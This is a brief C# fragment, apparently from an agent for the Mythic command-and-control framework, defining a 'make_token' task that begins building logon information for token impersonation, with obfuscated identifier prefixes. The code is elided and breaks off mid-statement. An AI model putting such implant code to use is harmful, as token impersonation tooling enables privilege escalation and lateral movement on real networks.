...
namespace Tasks
{
    public class make_token : Tasking
    {
        ...
        public make_token(IAgent agent, YXBqSVSFInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
        }
        public override void Start()
        {
            ...
            {
                YXBqSVSFLogonInformation info = new YXBqSVSFLogonInformation(
